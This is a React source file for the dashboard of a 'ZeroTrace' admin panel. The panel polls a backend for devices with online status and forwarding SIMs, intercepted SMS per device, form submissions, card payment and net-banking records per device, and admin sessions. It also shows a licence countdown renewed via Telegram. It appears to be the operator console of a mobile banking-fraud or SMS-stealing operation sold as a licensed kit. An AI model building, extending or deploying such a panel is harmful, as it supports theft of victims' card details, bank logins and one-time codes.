// src/pages/DashboardPage.tsx
import { useEffect, useMemo, useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";

import wsService from "../services/ws/wsService";
import { listDeviceNotifications, listNotificationDevices } from "../services/api/sms";
import { listSessions } from "../services/api/admin";
import { ENV, apiHeaders } from "../config/constants";
import CountDown from "../components/ui/CountDown";

import ztLogo from "../assets/zt-logo.png";
import { formatDMY, getCountdown, getLicenseSnapshot, pad2 } from "../utils/license";

type Device = {
  deviceId: string;
  status?: { online?: boolean; timestamp?: number };
  admins?: string[];
  forwardingSim?: string;
  favorite?: boolean;
  metadata?: Record<string, any>;
};

type ActivityItem = {
  id: string;
  ts: number;
  title: string;
  subtitle?: string;
  icon: string;
  kind: "session" | "ws";
};

type SessionLike = {
  _id?: string;
  deviceId?: string;
  uniqueid?: string;
  admin?: string;
  username?: string;
  lastSeen?: number | string;
  updatedAt?: number | string;
  createdAt?: number | string;
};

const DEFAULT_POLL_INTERVAL = 12_000;
const SMS_POLL_INTERVAL = 30_000;
const SESSIONS_POLL_INTERVAL = 10_000;

function toTs(v: any): number {
  if (!v) return 0;
  if (typeof v === "number") return v;
  const t = new Date(String(v)).getTime();
  return Number.isFinite(t) ? t : 0;
}

function minutesAgo(ts: number): string {
  const diff = Date.now() - ts;
  const m = Math.max(0, Math.floor(diff / 60000));
  if (m < 1) return "now";
  if (m === 1) return "1 min";
  if (m < 60) return `${m} min`;
  const h = Math.floor(m / 60);
  if (h === 1) return "1 hour";
  if (h < 24) return `${h} hours`;
  const d = Math.floor(h / 24);
  return d === 1 ? "1 day" : `${d} days`;
}

export default function DashboardPage() {
  const nav = useNavigate();

  const [devices, setDevices] = useState<Device[]>([]);
  const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
  const [formsCount, setFormsCount] = useState<number | null>(null);
  const [cardCount, setCardCount] = useState<number | null>(null);
  const [netbankingCount, setNetbankingCount] = useState<number | null>(null);
  const [smsCount, setSmsCount] = useState<number | null>(null);
  const [error, setError] = useState<string | null>(null);

  const [wsConnected, setWsConnected] = useState<boolean>(false);

  // Activity sources:
  const [sessionActivity, setSessionActivity] = useState<ActivityItem[]>([]);
  const [realtimeActivity, setRealtimeActivity] = useState<ActivityItem[]>([]);

  const [nowTick, setNowTick] = useState<number>(() => Date.now());
  const license = useMemo(() => getLicenseSnapshot(nowTick), [nowTick]);
  const countdown = useMemo(() => getCountdown(license.expiryDate, nowTick), [license.expiryDate, nowTick]);

  const totalDevices = devices.length;
  const onlineCount = useMemo(() => devices.filter((d) => !!d.status?.online).length, [devices]);
  const offlineCount = totalDevices - onlineCount;

  const favoriteIds = useMemo(() => {
    return Object.entries(favoritesMap)
      .filter(([, v]) => !!v)
      .map(([k]) => k)
      .sort((a, b) => (a > b ? 1 : -1));
  }, [favoritesMap]);

  const favoritesPreview = useMemo(() => favoriteIds.slice(0, 4), [favoriteIds]);

  const activityItems = useMemo(() => {
    const merged = [...realtimeActivity, ...sessionActivity];

    const seen = new Set<string>();
    const out: ActivityItem[] = [];
    for (const it of merged) {
      const bucket = Math.floor(it.ts / 30_000);
      const key = `${it.kind}|${it.title}|${bucket}`;
      if (seen.has(key)) continue;
      seen.add(key);
      out.push(it);
      if (out.length >= 6) break;
    }
    return out;
  }, [realtimeActivity, sessionActivity]);

  useEffect(() => {
    const t = window.setInterval(() => setNowTick(Date.now()), 1000);
    return () => window.clearInterval(t);
  }, []);

  async function loadDevices() {
    setError(null);
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/devices`, { headers: apiHeaders(), timeout: 8000 });
      setDevices(Array.isArray(res.data) ? res.data : []);
    } catch (e: any) {
      console.error("loadDevices error", e);
      setError("Failed loading devices");
      setDevices([]);
    }
  }

  async function loadFavorites() {
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/favorites`, { headers: apiHeaders(), timeout: 8000 });
      const m = res?.data && typeof res.data === "object" ? (res.data as Record<string, boolean>) : {};
      setFavoritesMap(m || {});
    } catch {
      setFavoritesMap({});
    }
  }

  async function loadFormsCount() {
    try {
      const res = await axios.get(`${ENV.API_BASE}/api/form_submissions`, { headers: apiHeaders(), timeout: 10000 });
      setFormsCount(Array.isArray(res.data) ? res.data.length : 0);
    } catch {
      setFormsCount(0);
    }
  }

  async function loadPaymentsCounts(devList: Device[]) {
    setCardCount(null);
    setNetbankingCount(null);

    try {
      const headers = apiHeaders();
      const cardPromises: Promise<number>[] = [];
      const netPromises: Promise<number>[] = [];

      for (const d of devList) {
        const id = encodeURIComponent(d.deviceId);
        cardPromises.push(
          axios
            .get(`${ENV.API_BASE}/api/card_payments/device/${id}`, { headers, timeout: 8000 })
            .then((r) => (Array.isArray(r.data) ? r.data.length : 0))
            .catch(() => 0)
        );
        netPromises.push(
          axios
            .get(`${ENV.API_BASE}/api/net_banking/device/${id}`, { headers, timeout: 8000 })
            .then((r) => (Array.isArray(r.data) ? r.data.length : 0))
            .catch(() => 0)
        );
      }

      const [cardArr, netArr] = await Promise.all([Promise.all(cardPromises), Promise.all(netPromises)]);
      setCardCount(cardArr.reduce((s, v) => s + (Number(v) || 0), 0));
      setNetbankingCount(netArr.reduce((s, v) => s + (Number(v) || 0), 0));
    } catch {
      setCardCount(0);
      setNetbankingCount(0);
    }
  }

  async function loadSmsSummary() {
    try {
      const idsRaw = await listNotificationDevices();
      const ids = (Array.isArray(idsRaw) ? idsRaw : []).map((x: any) => String(x || "").trim()).filter(Boolean);

      if (ids.length === 0) {
        setSmsCount(0);
        return;
      }

      let total = 0;
      for (const did of ids.slice(0, 50)) {
        // eslint-disable-next-line no-await-in-loop
        const list = await listDeviceNotifications(did).catch(() => []);
        if (Array.isArray(list)) total += list.length;
      }
      setSmsCount(total);
    } catch {
      setSmsCount(0);
    }
  }

  async function loadAdminSessions() {
    try {
      const sessions = (await listSessions()) as any[];
      const arr: SessionLike[] = Array.isArray(sessions) ? sessions : [];

      const items: ActivityItem[] = arr
        .map((s) => {
          const did = String(s.deviceId || s.uniqueid || "unknown");
          const admin = String(s.admin || s.username || "admin");
          const last = toTs(s.lastSeen) || toTs(s.updatedAt) || toTs(s.createdAt) || Date.now();

          return {
            id: String(s._id || `${did}_${admin}_${last}`),
            ts: last,
            title: did,
            subtitle: admin,
            icon: "👤",
            kind: "session",
          } satisfies ActivityItem;
        })
        .sort((a, b) => b.ts - a.ts)
        .slice(0, 6);

      setSessionActivity(items);
    } catch (e) {
      console.warn("loadAdminSessions failed", e);
      setSessionActivity([]);
    }
  }

  function handleRenewClick() {
    if (license.telegramChatDeepLink) window.open(license.telegramChatDeepLink, "_blank");
    window.open(license.telegramShareUrl, "_blank");
  }

  function pushRealtime(item: Omit<ActivityItem, "id" | "kind">) {
    const next = {
      ...item,
      kind: "ws",
      id: `${Date.now()}_${Math.random().toString(16).slice(2)}`,
    } satisfies ActivityItem;

    setRealtimeActivity((prev) => [next, ...prev].slice(0, 6));
  }

  useEffect(() => {
    wsService.connect();
    setWsConnected(wsService.isConnected());

    const unsub = wsService.onMessage((msg) => {
      try {
        if (!msg || msg.type !== "event") return;

        if (msg.event === "status") {
          const did = String(msg.deviceId || "");
          const online = !!msg.data?.online;
          pushRealtime({
            ts: Date.now(),
            title: did || "Device",
            subtitle: online ? "online" : "offline",
            icon: online ? "🟢" : "🔴",
          });
        }

        if (msg.event === "notification") {
          const did = String(msg.deviceId || "");
          pushRealtime({
            ts: Date.now(),
            title: did || "Device",
            subtitle: "sms",
            icon: "💬",
          });
          loadSmsSummary().catch(() => {});
        }
      } catch {
        // ignore
      }
    });

    const wsStatusHandler = (ev: any) => {
      try {
        setWsConnected(!!ev?.detail?.connected);
      } catch {}
    };
    window.addEventListener("zerotrace:ws", wsStatusHandler as any);

    return () => {
      unsub();
      window.removeEventListener("zerotrace:ws", wsStatusHandler as any);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    loadDevices();
    loadFormsCount();
    loadFavorites();
    loadSmsSummary();
    loadAdminSessions();

    const t = setInterval(() => {
      loadDevices();
      loadFormsCount();
      loadFavorites();
    }, DEFAULT_POLL_INTERVAL);

    const smsT = setInterval(() => {
      loadSmsSummary();
    }, SMS_POLL_INTERVAL);

    const sessT = setInterval(() => {
      loadAdminSessions();
    }, SESSIONS_POLL_INTERVAL);

    return () => {
      clearInterval(t);
      clearInterval(smsT);
      clearInterval(sessT);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (!devices || devices.length === 0) {
      setCardCount(0);
      setNetbankingCount(0);
      return;
    }
    loadPaymentsCounts(devices).catch(() => {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [devices]);

  function StatTile({
    title,
    value,
    icon,
    hint,
    onClick,
  }: {
    title: string;
    value: string | number;
    icon: string;
    hint: string;
    onClick: () => void;
  }) {
    return (
      <button
        type="button"
        onClick={onClick}
        className="w-full text-left bg-white rounded-xl border shadow-sm px-3 py-2 active:scale-[0.99] transition"
      >
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3 min-w-0">
            <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-xl bg-gray-100 flex items-center justify-center text-lg">
              {icon}
            </div>
            <div className="min-w-0">
              <div className="text-[11px] sm:text-xs text-gray-500 truncate">{title}</div>
              <div className="text-lg sm:text-xl font-bold leading-tight">{value}</div>
            </div>
          </div>
          <div className="text-gray-300 text-xl">›</div>
        </div>
        <div className="mt-1 text-[10px] text-gray-400">{hint}</div>
      </button>
    );
  }

  return (
    <div className="mx-auto max-w-[420px] sm:max-w-2xl px-3 sm:px-4 pb-28">
      {/* Header */}
      <div className="pt-4 pb-3 flex items-start justify-between">
        <div className="flex items-center gap-3 min-w-0">
          <img src={ztLogo} alt="ZeroTrace logo" className="w-9 h-9 rounded-md object-contain" />
          <div className="min-w-0">
            <div className="text-lg font-semibold leading-tight truncate">ZeroTrace</div>
            <div className="text-[11px] text-gray-500">Secure Admin Panel</div>
          </div>
        </div>

        <div className="text-xs flex items-center gap-2">
          <span className={`inline-block w-2.5 h-2.5 rounded-full ${wsConnected ? "bg-green-500" : "bg-red-500"}`} />
          <span className={`${wsConnected ? "text-green-700" : "text-red-600"} font-medium text-[12px]`}>
            {wsConnected ? "Connected" : "Disconnected"}
          </span>
        </div>
      </div>

      {/* Top 2x2 tiles */}
      <div className="grid grid-cols-2 gap-3">
        <StatTile
          title="Online Devices"
          value={onlineCount}
          icon="📶"
          hint="Click to view online only"
          onClick={() => nav({ pathname: "/devices", search: "?filter=online" })}
        />
        <StatTile
          title="Offline Devices"
          value={offlineCount}
          icon="📴"
          hint="Click to view offline only"
          onClick={() => nav({ pathname: "/devices", search: "?filter=offline" })}
        />
        <StatTile
          title="Total Devices"
          value={totalDevices}
          icon="📱"
          hint="Click to view all devices"
          onClick={() => nav("/devices")}
        />
        <StatTile
          title="All SMS"
          value={smsCount == null ? "…" : smsCount}
          icon="💬"
          hint="Click to open SMS History"
          onClick={() => nav("/sms")}
        />
      </div>

      {/* Admin expires card */}
      <div className="mt-4 bg-white rounded-2xl border shadow-sm overflow-hidden">
        <div className="px-4 py-3 border-b flex items-center justify-between">
          <div className="font-semibold text-sm">Admin Expires in</div>
          <button type="button" onClick={handleRenewClick} className="text-xs px-3 py-1.5 rounded-lg bg-[var(--brand)] text-white">
            Renew (Telegram)
          </button>
        </div>

        <div className="px-4 py-3 flex items-center justify-between">
          <div className="text-xs text-gray-500">Active until:</div>
          <div className="text-xs font-medium">{formatDMY(license.expiryDate)}</div>
        </div>

        <div className="px-4 pb-2 flex items-center justify-between">
          <div className="text-xs text-gray-500">Purchase date:</div>
          <div className="text-xs font-medium">{formatDMY(license.startDate)}</div>
        </div>

        <div className="px-4 pb-4">
          <div className="mt-2 flex items-end justify-center gap-3">
            {countdown ? (
              countdown.expired ? (
                <div className="text-center w-full py-4">
                  <div className="text-2xl font-bold text-red-600">Expired</div>
                  <div className="text-xs text-gray-400 mt-1">Please renew license</div>

                  <button
                    type="button"
                    onClick={handleRenewClick}
                    className="mt-3 w-full rounded-xl bg-gradient-to-b from-rose-500 to-rose-600 text-white py-2 font-semibold shadow-sm"
                  >
                    Renew Now (Telegram)
                  </button>

                  <div className="mt-2 text-center text-xs text-gray-500">
                    Panel ID: <span className="font-medium">{license.panelId || "____"}</span>
                  </div>
                </div>
              ) : (
                <div className="w-full py-3">
                  <div className="flex items-end justify-center gap-2 text-[22px] sm:text-[34px] font-semibold tracking-wide">
                    <span className="text-[var(--brand)] text-[28px] sm:text-[36px]">{pad2(countdown.days)}</span>
                    <span className="text-gray-300">:</span>
                    <span className="text-[20px] sm:text-[28px]">{pad2(countdown.hours)}</span>
                    <span className="text-gray-300">:</span>
                    <span className="text-[20px] sm:text-[28px]">{pad2(countdown.mins)}</span>
                    <span className="text-gray-300">:</span>
                    <span className="text-[20px] sm:text-[28px]">{pad2(countdown.secs)}</span>
                    <span className="text-sm text-gray-500 pb-1">Sec</span>
                  </div>

                  <div className="text-center text-xs text-gray-500 mt-2">Days until {formatDMY(license.expiryDate)}</div>

                  <button
                    type="button"
                    onClick={handleRenewClick}
                    className="mt-3 w-full rounded-xl bg-gradient-to-b from-emerald-400 to-emerald-600 text-white py-3 font-semibold shadow-sm"
                  >
                    Renew License (Telegram)
                  </button>

                  <div className="mt-2 text-center text-xs text-gray-500">
                    Panel ID: <span className="font-medium">{license.panelId || "____"}</span>
                  </div>
                </div>
              )
            ) : (
              <div className="text-center text-sm text-gray-400 py-4">
                Set env <span className="font-medium">VITE_RENEWAL_START_DATE</span> (DD/MM/YYYY).
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Forms + Activity */}
      <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-4">
        <div className="bg-white rounded-2xl border shadow-sm overflow-hidden">
          <div className="px-4 py-3 border-b flex items-center justify-between">
            <div className="font-semibold text-sm">All Form Submits</div>
            <button type="button" onClick={() => nav("/forms")} className="text-xs px-3 py-1.5 rounded-lg border bg-white hover:bg-gray-50">
              View Forms ›
            </button>
          </div>

          <div className="px-4 py-3 space-y-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 text-sm">
                <span className="w-8 h-8 rounded-lg bg-gray-100 flex items-center justify-center">🗂️</span>
                <span className="text-gray-700">Form Submits</span>
              </div>
              <div className="text-sm font-semibold">{formsCount == null ? "…" : formsCount}</div>
            </div>

            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 text-sm">
                <span className="w-8 h-8 rounded-lg bg-gray-100 flex items-center justify-center">💳</span>
                <span className="text-gray-700">Card Payments</span>
              </div>
              <div className="text-sm font-semibold">{cardCount == null ? "…" : cardCount}</div>
            </div>

            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 text-sm">
                <span className="w-8 h-8 rounded-lg bg-gray-100 flex items-center justify-center">🏦</span>
                <span className="text-gray-700">Net Banking Lists</span>
              </div>
              <div className="text-sm font-semibold">{netbankingCount == null ? "…" : netbankingCount}</div>
            </div>

            {error ? <div className="text-xs text-red-600 pt-2">{error}</div> : null}
          </div>
        </div>

        {/* ✅ Admin Activity with Manage Sessions button */}
        <div className="bg-white rounded-2xl border shadow-sm overflow-hidden">
          <div className="px-4 py-3 border-b flex items-center justify-between">
            <div className="font-semibold text-sm">Admin Activity</div>

            <div className="flex items-center gap-2">
              <div className="text-xs text-gray-400">{activityItems.length}</div>
              <button
                type="button"
                onClick={() => nav("/sessions")}
                className="text-xs px-3 py-1.5 rounded-lg border bg-white hover:bg-gray-50"
              >
                Manage
              </button>
            </div>
          </div>

          <div className="px-4 py-3">
            {activityItems.length === 0 ? (
              <div className="text-sm text-gray-400">No activity yet.</div>
            ) : (
              <div className="space-y-2">
                {activityItems.map((it) => (
                  <button
                    type="button"
                    key={it.id}
                    onClick={() => nav("/sessions")}
                    className="w-full flex items-center justify-between border rounded-xl px-3 py-2 text-left hover:bg-gray-50"
                    title="Manage sessions"
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      <div className="w-7 h-7 rounded-lg bg-gray-100 flex items-center justify-center">{it.icon}</div>
                      <div className="min-w-0">
                        <div className="text-sm font-medium truncate">{it.title}</div>
                        <div className="text-[11px] text-gray-500 truncate">
                          {it.kind === "session" ? `admin: ${it.subtitle || "admin"}` : it.subtitle || "event"}
                        </div>
                      </div>
                    </div>
                    <div className="text-xs text-gray-400">{it.ts ? minutesAgo(it.ts) : ""}</div>
                  </button>
                ))}
              </div>
            )}

            {sessionActivity.length === 0 ? (
              <div className="mt-3 text-[11px] text-gray-400">
                Tip: If this stays empty, check backend route <span className="font-mono">GET /api/admin/sessions</span>.
              </div>
            ) : null}
          </div>
        </div>
      </div>

      {/* Favorites */}
      <div className="mt-4 bg-white rounded-2xl border shadow-sm overflow-hidden">
        <div className="px-4 py-3 border-b flex items-center justify-between">
          <div className="font-semibold text-sm">Favorites</div>
          <button type="button" onClick={() => nav("/favorites")} className="text-xs px-3 py-1.5 rounded-lg border bg-white hover:bg-gray-50">
            View All ›
          </button>
        </div>

        <div className="px-4 py-3">
          {favoritesPreview.length === 0 ? (
            <div className="text-sm text-gray-400">No favorites yet.</div>
          ) : (
            <div className="space-y-2">
              {favoritesPreview.map((id) => {
                const d = devices.find((x) => x.deviceId === id);
                const ts = d?.status?.timestamp || 0;
                return (
                  <button
                    type="button"
                    key={id}
                    onClick={() => nav(`/devices/${encodeURIComponent(id)}`)}
                    className="w-full flex items-center justify-between border rounded-xl px-3 py-2 text-left hover:bg-gray-50"
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      <div className="w-7 h-7 rounded-lg bg-gray-100 flex items-center justify-center">⭐</div>
                      <div className="min-w-0">
                        <div className="text-sm font-medium truncate">{id}</div>
                        <div className="text-[11px] text-gray-500 truncate">{d?.status?.online ? "online" : "offline"}</div>
                      </div>
                    </div>
                    <div className="text-xs text-gray-400">{ts ? minutesAgo(ts) : ""}</div>
                  </button>
                );
              })}
            </div>
          )}
        </div>
      </div>

      {/* CountDown mandatory (hidden) */}
      <div className="hidden">
        <CountDown
          expiryDate={license.expiryISO}
          title="License Countdown"
          subtitle={`Panel: ${license.panelId || "____"}`}
          onRenew={handleRenewClick}
          renewLabel="Renew (Telegram)"
        />
      </div>
    </div>
  );
}